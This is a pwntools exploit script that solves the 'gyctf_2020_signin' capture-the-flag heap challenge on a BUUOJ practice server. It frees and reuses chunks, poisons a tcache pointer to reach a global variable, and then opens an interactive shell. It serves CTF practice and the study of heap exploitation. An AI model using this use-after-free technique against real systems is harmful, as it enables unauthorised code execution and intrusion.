from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('gyctf_2020_signin')
io = remote('node4.buuoj.cn', 29909)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
elf = ELF('gyctf_2020_signin')
ptr = elf.sym['ptr']

def add(index):
    io.sendlineafter('your choice?', '1')
    io.sendlineafter('idx?', str(index))


def edit(index, content):
    io.sendlineafter('your choice?', '2')
    io.sendlineafter('idx?', str(index))
    io.send(content)


def delete(index):
    io.sendlineafter('your choice?', '3')
    io.sendlineafter('idx?', str(index))


def pwn():
    for i in range(8):
        add(i)
    for i in range(8):
        delete(i)
    edit(7, p64(ptr - 0x10))
    add(8)
    io.sendlineafter('your choice?', '6')
    io.interactive()


if __name__ == '__main__':
    pwn()
